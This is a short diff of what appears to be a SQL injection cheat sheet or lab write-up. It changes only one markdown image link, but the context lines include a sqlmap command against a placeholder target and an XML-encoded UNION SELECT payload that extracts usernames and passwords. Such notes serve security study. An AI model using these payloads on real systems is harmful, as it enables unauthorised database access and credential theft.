@@ -461,7 +461,7 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 <storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
 ```  
 
-![SQL injection with filter bypass via XML encoding obfuscation]([xml+sql+obfuscation.png)  
+![SQL injection with filter bypass via XML encoding obfuscation](xml-sql-obfuscation.png)  
 
 >SQLi Payloads to read local file, and or output to another folder on target.  
 
